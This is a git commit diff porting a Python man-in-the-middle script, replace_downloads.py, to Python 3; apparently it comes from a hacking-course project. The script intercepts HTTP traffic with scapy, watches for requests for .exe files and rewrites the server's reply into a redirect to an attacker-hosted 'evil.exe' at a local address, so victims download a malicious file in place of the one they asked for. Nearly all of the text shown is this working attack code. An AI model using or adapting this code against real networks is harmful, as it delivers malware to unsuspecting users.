5ac70b6f6a8dfab68bf05fc6a72a9e76484ba28c
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-04-27 12:37:54 +0530

    Compatible with Python3 and Python2

--- replace_downloads.py
+++ replace_downloads.py
@@ -13,7 +13,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
@@ -21,7 +21,7 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+]Replacing file")
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.23/evil-files/evil.exe\n\n")
-                packet.set_payload(str(modified_packet))
+                packet.set_payload(bytes(modified_packet))
 
 
     packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website
